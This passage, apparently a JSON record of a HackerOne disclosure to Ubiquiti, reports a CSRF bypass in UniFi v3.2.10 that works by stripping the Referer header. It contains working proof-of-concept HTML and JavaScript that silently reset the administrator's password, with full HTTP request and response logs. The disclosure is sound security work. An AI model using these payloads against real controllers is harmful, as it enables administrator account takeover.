class=\"mi\">0</span><span class=\"p\">].</span><span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">getElementById</span><span class=\"p\">(</span><span class=\"s1\">&#39;csrf&#39;</span><span class=\"p\">).</span><span class=\"nx\">submit</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n<span class=\"nt\">&lt;/head&gt;</span>\n<span class=\"nt\">&lt;body</span> <span class=\"na\">onload=</span><span class=\"s\">&quot;load()&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;iframe</span> <span class=\"na\">src=</span><span class=\"s\">&quot;about:blank&quot;</span> <span class=\"na\">id=</span><span class=\"s\">&quot;noreferer&quot;</span><span class=\"nt\">&gt;&lt; /iframe&gt;</span>\n</code></pre>\n<p>The HTTP POST request issued by the script looks like the following (notice that the Referer Header is missing):</p>\n<pre class=\"highlight plaintext\"><code>POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\nConnection: keep-alive\nContent-Length: 172\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: http://www.rcesecurity.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\nContent-Type: text/plain\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\nCookie: unifises=742beba0de5c180ed18233629918a217\nHost: 127.0.0.1:8443\n\njson=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=\n</code></pre>\n<p>And the application responds with an HTTP 200 code again:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 200 OK\nServer: Apache-Coyote/1.1\nContent-Type: application/json;charset=ISO-8859-1\nContent-Length: 41\nDate: Thu, 19 Mar 2015 17:31:25 GMT\n\n{ &quot;data&quot; : [ ] , &quot;meta&quot; : { &quot;rc&quot; : &quot;ok&quot;}}\n</code></pre>\n<p>The attacker is now able to login to the UniFi interface using the following request:</p>\n<pre class=\"highlight plaintext\"><code>POST https://127.0.0.1:8443/login HTTP/1.1\nConnection: keep-alive\nContent-Length: 43\nCache-Control: max-age=0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nOrigin: https://127.0.0.1:8443\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\nContent-Type: application/x-www-form-urlencoded\nReferer: https://127.0.0.1:8443/login\nAccept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\nHost: 127.0.0.1:8443\n\nusername=admin&amp;password=csrfpwd&amp;login=Login\n</code></pre>\n<p>Whereas the application responds with an HTTP 302 code:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 302 Found\nServer: Apache-Coyote/1.1\nSet-Cookie: unifises=69f8ad84135bd1a2715e1530d4e07698; Path=/; Secure; HttpOnly\nLocation: https://127.0.0.1:8443/manage/s/default\nContent-Type: text/html;charset=UTF-8\nContent-Length: 0\nDate: Thu, 19 Mar 2015 17:39:29 GMT\n</code></pre>\n<p>Attached you&#39;ll find the following files to help investigate the issue:<br>\npoc-0.png - Screenshot of changed user &quot;admin&quot;</p>\n\n<p>The used CSRF scripts are live on my domain <a href=\"/redirect?signature=3e1c40f80614f4200bac71f65b7545a8b1065bd3&amp;url=http%3A%2F%2Fwww.rcesecurity.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.rcesecurity.com</span><i class=\"icon-external-link\"></i></a> during your investigations:<br>\n<a title=\"http://www.rcesecurity.com/pocs/ubi_common_csrf.php\" href=\"/redirect?signature=fb98ab91b63a449d961b3d59841c59b226754465&amp;url=http%3A%2F%2Fwww.rcesecurity.com%2Fpocs%2Fubi_common_csrf.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.rcesecurity.com/pocs/ubi_common_csrf.php</span><i class=\"icon-external-link\"></i></a><br>\n<a title=\"http://www.rcesecurity.com/pocs/ubi_passwd_change.php\" href=\"/redirect?signature=1464b74da7c0a20b0db217008ab8590f345b8c1c&amp;url=http%3A%2F%2Fwww.rcesecurity.com%2Fpocs%2Fubi_passwd_change.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.rcesecurity.com/pocs/ubi_passwd_change.php</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>If you need any further assistance or PoCs please just let me know.</p>\n", 
    "vulnerability_information": "VULNERABILITY DESCRIPTION\r\n-----------\r\nThe application UniFi v3.2.10 uses JSON requests to add/edit/save/delete configuration options on the administrative web-interface, but the application has an insufficient Cross-Site Request Forgery protection in place by  only checking whether the Referer Header is present and if its actual value matches the host where the system is running (default: 127.0.0.1).\r\n\r\nVERSIONS AFFECTED\r\n------------\r\nUniFi v3.2.10 \r\nolder versions may be affected too.\r\n\r\nPROOF-OF-CONCEPT (Steps to reproduce):\r\n---------------\r\nThe following Proof-of-Concept will bypass the CSRF protection and change the password of the administrator. Basically all functionalities are vulnerable on the same way.\r\n\r\nTherefore a typical request to change the password of the user \"admin\" to \"test\" looks like the following when issued using the web interface:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 163\r\n    Accept: */*\r\n    Origin: https://127.0.0.1:8443\r\n    X-Requested-With: XMLHttpRequest\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) > Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n    Referer: https://127.0.0.1:8443/manage/s/default\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22test%22%2C%22email%22%3A%22admin%40admin.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\r\n\r\nThe following script (ubi_common_csrf.php) tries to exploit this vulnerability by changing the email address of the user \"admin\" to \"info@rcesecurity.com\" and the associated password to \"csrfpwd\":\r\n\r\n    <html>\r\n    <form action=\"https://127.0.0.1:8443/api/s/default/cmd/sitemgr\" method=\"post\" enctype=\"text/plain\">\r\n    <input name=\"json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%2$\r\n    <input type=submit>\r\n    </form>\r\n    </html>\r\n\r\nThis would lead to the following HTTP POST request with the HTTP Referer header set to e.g. http://www.rcesecurity.com, where the CSRF script is placed:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 173\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Referer: http://www.rcesecurity.com/pocs/common_csrf.php\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\r\n\r\nIn this case the application correctly responds with an HTTP 401 error code denying the password change:\r\n\r\n    HTTP/1.1 401 Unauthorized\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 78\r\n    Date: Thu, 19 Mar 2015 17:24:53 GMT\r\n\r\n    { \"data\" : [ ] , \"meta\" : { \"msg\" : \"api.err.LoginRequired\" , \"rc\" : \"error\"}}\r\n\r\nBut if the HTTP Referer-Header is stripped out from the HTTP Request:\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 173\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D==\r\n\r\nThe application answers with an HTTP 200 code and the password was successfully changed:\r\n\r\n    HTTP/1.1 200 OK\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 41\r\n    Date: Thu, 19 Mar 2015 17:28:21 GMT\r\n    \r\n    { \"data\" : [ ] , \"meta\" : { \"rc\" : \"ok\"}}\r\n\r\nSo all an attacker has to to is to strip out the HTTP Referer Header in a CSRF attack scenario like using the following script (ubi_passwd_change.php):\r\n\r\n    <html>\r\n    <head>\r\n    <script>\r\n    function load() {\r\n        var postdata = '<form id=csrf method=POST enctype=\\'text\\/plain\\' action=\\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\'>' +\r\n                        '<input type=hidden name=\\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\' value=\\'\\' />' +\r\n                        '</form>';\r\n        top.frames[0].document.body.innerHTML=postdata;\r\n        top.frames[0].document.getElementById('csrf').submit();\r\n    }\r\n    </script>\r\n    </head>\r\n    <body onload=\"load()\">\r\n    <iframe src=\"about:blank\" id=\"noreferer\">< /iframe>\r\n\r\nThe HTTP POST request issued by the script looks like the following (notice that the Referer Header is missing):\r\n\r\n    POST https://127.0.0.1:8443/api/s/default/cmd/sitemgr HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 172\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: http://www.rcesecurity.com\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)    Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: text/plain\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Cookie: unifises=742beba0de5c180ed18233629918a217\r\n    Host: 127.0.0.1:8443\r\n    \r\n    json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40rcesecurity.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D=\r\n\r\nAnd the application responds with an HTTP 200 code again:\r\n\r\n    HTTP/1.1 200 OK\r\n    Server: Apache-Coyote/1.1\r\n    Content-Type: application/json;charset=ISO-8859-1\r\n    Content-Length: 41\r\n    Date: Thu, 19 Mar 2015 17:31:25 GMT\r\n    \r\n    { \"data\" : [ ] , \"meta\" : { \"rc\" : \"ok\"}}\r\n\r\nThe attacker is now able to login to the UniFi interface using the following request:\r\n\r\n    POST https://127.0.0.1:8443/login HTTP/1.1\r\n    Connection: keep-alive\r\n    Content-Length: 43\r\n    Cache-Control: max-age=0\r\n    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n    Origin: https://127.0.0.1:8443\r\n    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Referer: https://127.0.0.1:8443/login\r\n    Accept-Language: de-DE,de;q=0.8,en-US;q=0.6,en;q=0.4\r\n    Host: 127.0.0.1:8443\r\n    \r\n    username=admin&password=csrfpwd&login=Login\r\n\r\nWhereas the application responds with an HTTP 302 code:\r\n\r\n    HTTP/1.1 302 Found\r\n    Server: Apache-Coyote/1.1\r\n    Set-Cookie: unifises=69f8ad84135bd1a2715e1530d4e07698; Path=/; Secure; HttpOnly\r\n    Location: https://127.0.0.1:8443/manage/s/default\r\n    Content-Type: text/html;charset=UTF-8\r\n    Content-Length: 0\r\n    Date: Thu, 19 Mar 2015 17:39:29 GMT\r\n\r\nAttached you'll find the following files to help investigate the issue:\r\npoc-0.png - Screenshot of changed user \"admin\"\r\n\r\nThe used CSRF scripts are live on my domain www.rcesecurity.com during your investigations:\r\nhttp://www.rcesecurity.com/pocs/ubi_common_csrf.php\r\nhttp://www.rcesecurity.com/pocs/ubi_passwd_change.php\r\n\r\nIf you need any further assistance or PoCs please just let me know.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://ubnt.com", 
            "about": "", 
            "twitter_handle": "", 
            "name": "Ubiquiti Networks"
        }, 
        "handle": "ubnt", 
        "url": "https://hackerone.com/ubnt", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/800/19a040983c9b2494808c87f77337d30023b97ea7_small.png?1419364363", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/800/50186ca2136da762df66f3ba92606dc8b925816f_medium.png?1419364363"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 800, 
        "default_currency": "usd"
    }, 
    "is_published": false
}